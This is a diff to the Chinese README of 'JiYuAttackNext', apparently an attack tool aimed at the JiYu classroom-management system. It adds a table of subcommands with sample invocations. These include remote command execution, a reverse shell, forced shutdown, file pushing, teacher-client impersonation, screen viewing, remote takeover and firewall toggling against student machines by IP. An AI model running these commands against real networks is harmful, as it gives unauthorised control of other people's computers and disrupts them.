@@ -39,6 +39,7 @@ GUI 与 CLI 已合并到同一个单文件 EXE：从 [Nightly Build](https://git
 
 | 参数 | 一句话说明 |
 | --- | --- |
+| `remote message` | 文本消息页：`-msg` 或 `--msg-file` 二选一 |
 | `-msg` / `--msg-file` | 给学生机弹一句话，太长自动拆条；`--msg-file` 是从文件读 |
 | `-c` | 让学生机执行一条命令行 |
 | `-l` / `-t` | 重复发几轮、每轮隔几秒 |
@@ -141,6 +142,38 @@ start /wait JiYuAttackNext.exe -ip 10.49.151.29 -msg "Hello"
 ```
 
 重定向输出（`> 结果.txt`）与管道仍然有效。
+
+<br>
+
+## 分组命令
+
+命令按图形界面的分组组织，一个页面就是一条子命令，因此不记得参数时可以先从分组找：
+
+```powershell
+# 先看有哪些分组
+.\JiYuAttackNext.exe -h
+
+# 再看某个页面能用哪些参数
+.\JiYuAttackNext.exe teacher appcmd -h
+```
+
+| 分组 | 子命令 | 对应界面页面 | 例子 |
+| --- | --- | --- | --- |
+| `remote` 远程攻击 | `message` | 文本消息 | `remote message -ip 192.168.1.10 -msg "下课了"` |
+| | `file` | 文件传送 | `remote file -ip 192.168.1.10 --file 报告.pdf` |
+| | `device` | 设备操作 | `remote device -ip 192.168.1.10 --shutdown --power-delay 30 --power-text 请保存` |
+| | `command` | 远程命令 | `remote command -ip 192.168.1.10 -c whoami` |
+| | `shell` | 反弹终端 | `remote shell -ip 192.168.1.10` |
+| `teacher` 教师端模拟 | `appcmd` | 应用命令 | `teacher appcmd -ip 192.168.1.10 --run notepad.exe` |
+| | `students` | 学生信息 | `teacher students --seconds 8` |
+| | `screen` | 屏幕画面 | `teacher screen -ip 192.168.1.10 --preview` |
+| | `control` | 远程接管 | `teacher control -ip 192.168.1.10`（打开图形界面） |
+| | `chat` | 聊天消息 | `teacher chat -ip 192.168.1.10 "安静一下"` |
+| | `closewindow` | 关闭窗口 | `teacher closewindow -ip 192.168.1.10 记事本` |
+| `local` 本机工具 | `info` | 本机信息 | `local info` |
+| | `firewall` | 防火墙 | `local firewall block`、`local firewall allow` |
+
+子命令之后的参数与下面“参数参考”完全一致，只是省掉了不属于该页面的部分。旧的扁平写法（`-ip ... -msg ...`、`--run ...`）仍然可用，两种写法解析出的字段相同，可以按习惯自由选择；同一次调用里混用两种写法会报参数错误。
 
 <br>
 
